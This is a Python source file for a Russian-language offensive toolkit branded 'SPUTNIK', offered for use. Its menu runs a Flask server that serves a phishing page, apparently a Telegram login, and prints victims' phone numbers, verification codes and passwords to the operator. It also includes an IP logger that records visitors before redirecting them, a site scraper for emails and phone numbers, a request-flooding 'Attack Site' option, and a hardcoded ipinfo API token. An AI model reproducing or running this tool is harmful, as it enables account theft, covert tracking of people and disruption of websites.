import requests
import pystyle
from pystyle import Write, Colors, Center, Box
import requests
from bs4 import BeautifulSoup
import json
import re
import socket
from urllib.parse import urlparse
import uuid
import time
from flask import Flask, request
from datetime import datetime
import threading
import requests
from flask import Flask, request, render_template, jsonify
import socket
import json
from datetime import datetime
import os
import http.server
import socketserver




def get_ip_info(ip_address, token):
    url = f'https://ipinfo.io/{ip_address}?token={token}'
    response = requests.get(url)
    data = response.json()
    return data

def ip_lookup():
    ip_address = input("Введите IP-адрес для поиска информации: ")
    token = '45ac41e873d9eb'  # Ваш API-токен IPinfo
    ip_info = get_ip_info(ip_address, token)
    
    print(f"Информация о IP-адресе {ip_address}:")
    print(f"Страна: {ip_info.get('country')}")
    print(f"Регион: {ip_info.get('region')}")
    print(f"Город: {ip_info.get('city')}")
    print(f"Координаты: {ip_info.get('loc')}")
    print(f"Почтовый индекс: {ip_info.get('postal')}")
    print(f"Организация (провайдер): {ip_info.get('org')}")

def fetch_page(url):
    """Загружает HTML-страницу по заданному URL."""
    try:
        response = requests.get(url)
        response.raise_for_status()
        return response.text
    except requests.RequestException as e:
        print(f"Ошибка загрузки {url}: {e}")
        return None

def parse_site_info(html, base_url):
    """Извлекает информацию с веб-страницы."""
    soup = BeautifulSoup(html, 'html.parser')
    
    # Название сайта
    title = soup.title.text.strip() if soup.title else "Без названия"
    
    # Ссылки
    links = [a['href'] for a in soup.find_all('a', href=True)]
    
    # Электронные адреса
    emails = set(re.findall(r'[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}', html))
    
    # Номера телефонов (упрощенное выражение для демонстрации)
    phone_numbers = set(re.findall(r'\+?\d[\d -]{8,}\d', html))
    
    # Платежные системы (поиск по ключевым словам)
    payment_systems = []
    payment_keywords = ['paypal', 'visa', 'mastercard', 'stripe', 'apple pay', 'google pay']
    for keyword in payment_keywords:
        if keyword in html.lower():
            payment_systems.append(keyword)
    
    # Домен и IP-адрес
    parsed_url = urlparse(base_url)
    domain = parsed_url.netloc
    try:
        ip_address = socket.gethostbyname(domain)
    except socket.gaierror:
        ip_address = "IP не найден"
    
    return {
        'title': title,
        'links': links,
        'emails': list(emails),
        'phone_numbers': list(phone_numbers),
        'payment_systems': payment_systems,
        'domain': domain,
        'ip_address': ip_address
    }

def save_to_json(site_url, site_info):
    """Сохраняет собранную информацию в JSON-файле."""
    site_name = site_url.split('//')[-1].split('/')[0]
    filename = f"{site_name}.json"
    with open(filename, 'w') as f:
        json.dump(site_info, f, indent=4, ensure_ascii=False)
    print(f"Сохранено в файл: {filename}")

def crawl_and_save(url):
    """Основная функция для сбора и сохранения данных."""
    html = fetch_page(url)
    if html:
        site_info = parse_site_info(html, url)
        save_to_json(url, site_info)
    else:
        print("Не удалось получить HTML страницы.")
# Flask приложение
app = Flask(__name__)

def get_host_ip():
    hostname = socket.gethostname()
    ip_v4 = socket.gethostbyname(hostname)
    ip_v6 = socket.getaddrinfo(hostname, None, socket.AF_INET6)[0][4][0]
    return ip_v4, ip_v6

def log_ip_to_file(user_ip, ipv4, ipv6, mac_address):
    log_entry = {
        'datetime': datetime.now().strftime('%Y-%m-%d %H:%M:%S'),
        'ipv4': ipv4,
        'ipv6': ipv6,
        'mac_address': mac_address,
        'user_ip': user_ip
    }
    
    try:
        with open('iplog.json', 'r') as file:
            data = json.load(file)
    except FileNotFoundError:
        data = []

    data.append(log_entry)
    
    with open('iplog.json', 'w') as file:
        json.dump(data, file, indent=4)
    
    print(json.dumps(log_entry, indent=4))  # Выводим данные в консоль

@app.route('/')
def index():
    ip_v4, ip_v6 = get_host_ip()
    user_ip = request.remote_addr
    # Логируем IP-адрес при заходе на сайт
    log_ip_to_file(user_ip, ip_v4, ip_v6, 'Unknown')
    return render_template('index.html', ip=user_ip, ipv4=ip_v4, ipv6=ip_v6)

@app.route('/submit_phone', methods=['POST'])
def submit_phone():
    data = request.get_json()
    phone_number = data.get('phone')
    print(f'Phone number entered: {phone_number}')
    return jsonify({'status': 'success', 'phone': phone_number})

@app.route('/phone_verification/<phone_number>')
def phone_verification(phone_number):
    return render_template('verification.html', phone=phone_number)

@app.route('/submit_code', methods=['POST'])
def submit_code():
    data = request.get_json()
    verification_code = data.get('code')
    print(f'Verification code entered: {verification_code}')
    answer = input("PASS Y/N? ")
    if answer.upper() == 'Y':
        return jsonify({'status': 'password_required'})
    else:
        print("Good")
        return jsonify({'status': 'success'})

@app.route('/password_page')
def password_page():
    return render_template('password.html')

@app.route('/submit_password', methods=['POST'])
def submit_password():
    data = request.get_json()
    password = data.get('password')
    print(f'Password entered: {password}')
    return jsonify({'status': 'success'})

def run_flask_app():
    port = int(input('Введите номер порта: '))
    ip_v4, ip_v6 = get_host_ip()
    print(f'IPv4: {ip_v4}')
    print(f'IPv6: {ip_v6}')
    print(f'Сайт запущен. Перейдите по ссылке: http://{ip_v4}:{port}')
    app.run(host='0.0.0.0', port=port)


# Функция для получения текущего IP адреса сервера
def get_local_ip():
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    try:
        s.connect(("8.8.8.8", 80))
        ip = s.getsockname()[0]
    except Exception:
        ip = "127.0.0.1"
    finally:
        s.close()
    return ip

# Обработчик запросов
class MyHandler(http.server.SimpleHTTPRequestHandler):
    def __init__(self, *args, **kwargs):
        self.website = kwargs.pop('website', None)
        super().__init__(*args, **kwargs)

    def do_GET(self):
        # Получение IP адреса клиента
        client_ip = self.client_address[0]
        try:
            client_ipv4 = socket.gethostbyname(client_ip)
        except socket.gaierror:
            client_ipv4 = 'Not available'
        
        try:
            client_ipv6 = socket.getaddrinfo(client_ip, None, socket.AF_INET6)[0][4][0]
        except socket.gaierror:
            client_ipv6 = 'Not available'
        
        # Запись IP адреса в файл
        entry = {
            "ip": client_ip,
            "ipv4": client_ipv4,
            "ipv6": client_ipv6,
            "date_time": datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        }
        
        if not os.path.exists("ipproxy.json"):
            with open("ipproxy.json", "w") as file:
                json.dump([], file)  # Создаем пустой JSON массив в файле
        
        with open("ipproxy.json", "r+") as file:
            data = json.load(file)
            data.append(entry)
            file.seek(0)
            json.dump(data, file, indent=4)
        
        # Вывод IP адреса в консоль
        print(f"Client IP: {client_ip}, IPv4: {client_ipv4}, IPv6: {client_ipv6}")
        
        # Перенаправление на указанный сайт
        self.send_response(302)
        self.send_header('Location', self.website)
        self.end_headers()
def check_website_for_viruses(url):
    try:
        response = requests.get(url)
        response.raise_for_status()  # Check for HTTP errors
        
        # Use BeautifulSoup to parse the HTML content
        soup = BeautifulSoup(response.content, 'html.parser')
        
        # Simple check for the word "virus" in the HTML content
        if "virus" in soup.text.lower():
            print(f"The website {url} might contain a virus.")
        else:
            print(f"The website {url} seems to be clean.")
    except requests.exceptions.RequestException as e:
        print(f"An error occurred: {e}")
def make_requests(url, delay):
    try:
        while True:
            response = requests.get(url)
            print(f"Request made to {url}. Status code: {response.status_code}")
            time.sleep(delay)
    except requests.exceptions.RequestException as e:
        print(f"An error occurred: {e}")

def main():
    user_id = str(uuid.uuid4())
    print(f"")
    Write.Print(Center.XCenter(f"""

   ▄████████    ▄███████▄ ███    █▄      ███     ███▄▄▄▄    ▄█     ▄█   ▄█▄ 
  ███    ███   ███    ███ ███    ███ ▀█████████▄ ███▀▀▀██▄ ███    ███ ▄███▀ 
  ███    █▀    ███    ███ ███    ███    ▀███▀▀██ ███   ███ ███▌   ███▐██▀   
  ███          ███    ███ ███    ███     ███   ▀ ███   ███ ███▌  ▄█████▀    
▀███████████ ▀█████████▀  ███    ███     ███     ███   ███ ███▌ ▀▀█████▄    
         ███   ███        ███    ███     ███     ███   ███ ███    ███▐██▄   
   ▄█    ███   ███        ███    ███     ███     ███   ███ ███    ███ ▀███▄  
 ▄████████▀   ▄████▀      ████████▀     ▄████▀    ▀█   █▀  █▀     ███   ▀█▀ 
                                                                  ▀         


    ┌─────────────────────────────────────┐                           
    │  Выберите действие:                 │
    │                                     │
    │ 1) Пробив_айпи     2) PARSER        │ 
    │                                     │
    │ 3) PHISHING        4) IP_LOGGER     │
    │                                     │
    │ 5) URL_CHECK       6) Attack Site   │ 
    │                                     │
    │ tg: sputnikproducts 7) INFO         │  
    └─────────────────────────────────────┘ 
\n"""), Colors.white, interval=0.0)
    
    
    choice = input("\nВаш выбор: ")
    
    if choice == '1':
        ip_lookup()
    elif choice == '2':
        url = input("Введите URL сайта для сбора информации: ")
        crawl_and_save(url)
    elif choice == '3':
        threading.Thread(target=run_flask_app).start()
    elif choice == '4':
    # Ввод порта и ссылки на сайт
        port = int(input("Введите порт для подключения: "))
        website = input("Введите ссылку на сайт (например, http://example.com): ")

    # Получение локального IP адреса
        local_ip = get_local_ip()
        print(f"Сгенерированный IP-адрес: {local_ip}:{port}")

    # Запуск сервера
        with socketserver.TCPServer(("", port), lambda *args, **kwargs: MyHandler(*args, website=website, **kwargs)) as httpd:
            print(f"Сервер запущен на порту {port}")
            httpd.serve_forever()
    elif choice == '7':
        print("""
На счет фишинга, тут нету кучи готовых сайтов,
вы сами должны загрузить свой index.html и свои стили по папкам, по дэфолту тут мой шаблон фишинга telegram
для работы фишинг сайта НЕ ПО ЛОКАЛЬНОЙ СЕТИ вам придется открыть порты, или получить динамический айпи.
IP LOGGER это сократитель ссылки вы можете сократить example.com после чего вам выдастся айпи вы его даете человеку и при его переходе вы видите его IP адресс.
как открыть порты читайте тут > https://wiki.amperka.ru/articles:net-port-opening или https://telegra.ph/otkrytie-portov-SPUTNIK-SOFT-08-04      

если во время атаки на сайт выводит STATUS CODE 200 это удачно выполненый запрос, при завершении атаки на сайт закройте терминал 
              """)
    elif choice == '5':
        url = input("Enter the website URL: ")
        check_website_for_viruses(url)
    elif choice == '6':
        url = input("Enter the ddos website URL: ")
        delay = int(input("Задержка, В СЕКУНДАХ!!!: "))
        make_requests(url, delay)
    else:
        print("Неверный выбор. Пожалуйста, выберите 1 или 2.")
        

def print_header():
    Write.Print(Center.XCenter(f"""
██████████████████████████████████████████████████████████████████████████████████████████
██████████████████████████████████████████████████████████████████████████████████████████
██████████████████████████████████████████████████████████████████████████████████████████
██████████████████████████████████████████████████████████████████████████████████████████
██████████████████████████████████████████████████████████████████████████████████████████
██████████████████████████████████████████████████████████████████████████████████████████
██████████████████████████████████████████████████████████████████████████████████████████
██████████████████████████████████████████████████████████████████████████████████████████
██████████████████████████████████████████████████████████████████████████████████████████
██████████████████████████████████████████████████████████████████████████████████████████
██████████████████████████████████████████████████████████████████████████████████████████
██████████████████████████████████████████████████████████████████████████████████████████
████████████████████████████████████████▓▓▓▒▒▒▒▒▓▓████████████████████████████████████████
███████████████████████████████████▓▒░░░░░░░░░░░░░░░░▒▓███████████████████████████████████
████████████████████████████████▓▒░░░░░░░░▒▓███▒░░░░░░░░░▓████████████████████████████████
██████████████████████████████▓░░░░▓█▓░░░▓███████░░░▒█▓░░░░▒██████████████████████████████
████████████████████████████▓░░░░▓███░░░██████████░░░▓███▒░░░▓████████████████████████████
███████████████████████████▒░░░▒████░░░▒██████████▓░░░████▓░░░▒███████████████████████████
██████████████████████████▒░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░▒██████████████████████████
█████████████████████████▓░░░▓▓▓▓▓▓░░░▒▓▓▓▓▓▓▓▓▓▓▓▓▓░░░▓▓▓▓▓▓▒░░▓█████████████████████████
█████████████████████████▒░░▓██████░░░██████████████░░░▓██████░░░█████████████████████████
█████████████████████████░░░███████░░░██████████████▒░░▓██████░░░▓████████████████████████
█████████████████████████░░░███████░░░██████████████▒░░▓██████▒░░▓████████████████████████
█████████████████████████░░░███████░░░██████████████▒░░▓██████░░░▓████████████████████████
█████████████████████████▒░░▓██████░░░██████████████░░░▓██████░░░█████████████████████████
█████████████████████████▓░░░██████░░░▓█████████████░░░▓█████▒░░▒█████████████████████████
██████████████████████████▒░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░██████████████████████████
███████████████████████████▒░░░▓███▓░░░▒██████████▓░░░▓███▓░░░▒███████████████████████████
████████████████████████████▓░░░▒███▓░░░██████████▒░░▓███▒░░░▒████████████████████████████
██████████████████████████████▒░░░▒▓█▒░░░████████▒░░▒█▓▒░░░▒██████████████████████████████
████████████████████████████████▓░░░░░░░░░▒████▓░░░░▒░░░░▒████████████████████████████████
███████████████████████████████████▒░░░░░░░░░░░░░░░░░░▒▓██████████████████████████████████
███████████████████████████████████████▓▓▒▒▒░░▒▒▒▒▓███████████████████████████████████████
██████████████████████████████████████████████████████████████████████████████████████████
██████████████████████████████████████████████████████████████████████████████████████████
██████████████████████████████████████████████████████████████████████████████████████████
██████████████████████████████████████████████████████████████████████████████████████████
██████████████████████████████████████████████████████████████████████████████████████████
██████████████████████████████████████████████████████████████████████████████████████████
██████████████████████████████████████████████████████████████████████████████████████████
██████████████████████████████████████████████████████████████████████████████████████████
██████████████████████████████████████████████████████████████████████████████████████████
██████████████████████████████████████████████████████████████████████████████████████████
██████████████████████████████████████████████████████████████████████████████████████████
██████████████████████████████████████████████████████████████████████████████████████████
\n"""), Colors.white, interval=0.0)
    input("Нажмите Enter что бы продолжить...")
    # Очистка консоли
    os.system('cls' if os.name == 'nt' else 'clear')

if __name__ == "__main__":
        print_header()
        main()
